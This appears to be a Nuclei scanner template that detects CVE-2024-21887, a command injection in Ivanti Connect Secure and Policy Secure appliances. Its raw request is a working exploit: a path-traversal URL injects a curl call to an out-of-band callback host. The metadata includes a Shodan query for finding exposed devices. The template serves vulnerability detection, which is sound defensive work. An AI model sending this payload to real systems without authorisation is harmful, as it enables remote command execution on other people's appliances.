http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: header
    type: word
    words:
    - application/json
  - condition: and
    part: body
    type: word
    words:
    - '"result":'
    - '"message":'
  matchers-condition: and
  raw:
  - 'GET /api/v1/totp/user-backup-code/../../license/keys-status/%3bcurl%20{{interactsh-url}}
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-21887
info:
  author: pdresearch,parthmalhotra,iamnoooob
  classification:
    cpe: cpe:2.3:a:ivanti:connect_secure:9.0:*:*:*:*:*:*:*
    cve-id: CVE-2024-21887
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.1
    cwe-id: CWE-77
  description: A command injection vulnerability in web components of Ivanti Connect
    Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x)  allows an authenticated
    administrator to send specially crafted requests and execute arbitrary commands
    on the appliance.
  metadata:
    product: connect_secure
    shodan-query: html:"welcome.cgi?p=logo"
    vendor: ivanti
  name: Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x) - Command
    Injection
  reference:
  - https://forums.ivanti.com/s/article/CVE-2023-46805-Authentication-Bypass-CVE-2024-21887-Command-Injection-for-Ivanti-Connect-Secure-and-Ivanti-Policy-Secure-Gateways?language=en_US
  severity: critical
  tags: cve,cve2024,kev,rce,ivanti
